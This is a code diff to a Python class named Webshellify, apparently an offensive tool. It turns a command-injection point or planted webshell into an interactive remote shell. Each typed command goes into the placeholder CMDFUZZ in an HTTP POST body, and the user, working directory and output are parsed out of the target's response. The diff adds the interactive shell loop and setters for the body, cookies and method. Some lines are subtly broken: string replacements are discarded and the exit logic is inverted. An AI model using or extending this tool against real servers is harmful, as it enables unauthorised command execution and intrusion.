@@ -31,6 +31,10 @@ class Webshellify:
         # store necessary information that will improve the webshell
         self.workdir = "/"
         self.parentdir = "/"
+
+        self.host = ""
+        self.user = ""
+
         self.delimiter = "output"
 
         self.host = host
@@ -47,13 +51,13 @@ class Webshellify:
         self.headers = {
             "User-Agent" : "curl/7.82.0",
             "Accept" : "*/*",
-            "Host" : host,
+            "Host" : self.host,
             "Content-Type": "application/x-www-form-urlencoded",
         }
         self.cookies = {}
         self.method = "POST"
 
-        self.req_body_form = ""
+        self.body = ""
         self.queries = {}
         self.cmd_fuzz = "CMDFUZZ"
 
@@ -78,33 +82,36 @@ class Webshellify:
     """
     Extracts the output from the command call from the page results
 
-    this will return the current user, hostname and command response.
+    this will return the current user, working directory and command
+    response.
+
+    usage: user, wd, output = self.__extract_output(raw)
     """
     def __extract_output(self, raw):
+        # if(self.debug):
+        #     print(f"[debug] in funct `__extract_output`:\nraw: {raw}")
+
+        if(f"`{self.delimiter}`" not in raw):
+            raise Exception("[err] response data not found")
+
         user_regex = f"`{self.delimiter}-user`\n((.*\n)*)`\/{self.delimiter}-user`"
-        host_regex = f"`{self.delimiter}-host`\n((.*\n)*)`\/{self.delimiter}-host`"
         wd_regex = f"`{self.delimiter}-wd`\n((.*\n)*)`\/{self.delimiter}-wd`"
         output_regex = f"`{self.delimiter}`\n((.*\n)*)`\/{self.delimiter}`"
         user_re = re.compile(user_regex)
-        host_re = re.compile(host_regex)
         wd_re = re.compile(wd_regex)
         output_re = re.compile(output_regex)
         if(self.debug):
             print(f"""[debug] in funct `__extract_output`
-raw: {raw}
 user regex: {user_regex}
 match: {user_re.findall(raw)}
-host regex: {host_regex}
-match: {host_re.findall(raw)}
-host regex: {wd_regex}
+wd regex: {wd_regex}
 match: {wd_re.findall(raw)}
 output regex: {output_regex}
 match: {output_re.findall(raw)}""")
         user = user_re.findall(raw)[0][0]
-        host = host_re.findall(raw)[0][0]
         workdir = wd_re.findall(raw)[0][0]
         output = output_re.findall(raw)[0][0]
-        return user, host, workdir, output
+        return user, workdir, output
 
     """
     Sends an individual command in isolation to the host and path initialized.
@@ -141,7 +148,7 @@ match: {output_re.findall(raw)}""")
         # generate body (if it is neither a GET nor a HEAD request)
         body_str = ""
         if(self.method.upper() != "GET" and self.method.upper() != "HEAD"):
-            body_str = self.req_body_form
+            body_str = self.body
             if(self.cmd_fuzz in body_str):
                 body_str = body_str.replace(self.cmd_fuzz, cmd)
 
@@ -149,13 +156,6 @@ match: {output_re.findall(raw)}""")
         url = f"http://{self.host}/{self.path}{query_str}"
 
         # send request with payload
-        resp = req.request(
-                self.method.upper(),
-                url,
-                cookies=cookie_dict,
-                data=body_str,
-                headers=self.headers)
-
         if(self.debug):
             print(f"""
 [debug] in funct `send_command`
@@ -169,7 +169,54 @@ headers: {self.headers}
 """
             )
 
+        resp = req.request(
+                self.method.upper(),
+                url,
+                cookies=cookie_dict,
+                data=body_str,
+                headers=self.headers)
+
         return self.__extract_output(resp.text)
+
+    def __get_parent_dir(self, workdir):
+        # currently assuming a Linux machine, so paths are delimited by '/'
+        path_parts = workdir.split('/')
+        return '/'.join(path_parts[0:-1])
+
+    def __get_init_info(self):
+        user, workdir, output = self.send_command("pwd")
+        self.workdir = workdir
+        self.parentdir = self.__get_parent_dir(workdir)
+        self.user = user
+
+    def create_shell(self):
+        self.__get_init_info()
+        # capture KeyboardInterrupts
+        exit_confirm = False
+        while(True):
+            try:
+                current_dir = self.workdir.split('/')[-1]
+                shell_prompt = f"{self.user}@{self.host} : {current_dir} >"
+                command = input(shell_prompt)
+
+                if(" .." in command):
+                    command.replace(" ..", f" {self.parentdir}")
+
+                if(" ." in command):
+                    command.replace(" .", f" {self.workdir}")
+
+                user, workdir, output = self.send_command(command)
+                self.user = user
+                self.workdir = workdir
+                self.parentdir = self.__get_parent_dir(workdir)
+                print(output)
+            except KeyboardInterrupt:
+                if(exit_confirm):
+                    print("[note] ^C pressed, this will close the current shell.")
+                    print("[note] please press ^C again to close the program")
+                    continue
+                print("[note] exiting...")
+                return
 
     def set_body(self, body):
         self.body = body
@@ -178,4 +225,10 @@ headers: {self.headers}
         self.queries[key] = value
 
     def set_header(self, key, value):
-        self.header[key] = value
+        self.headers[key] = value
+
+    def set_cookie(self, key, value):
+        self.cookies[key] = value
+
+    def set_method(self, method):
+        self.method = method
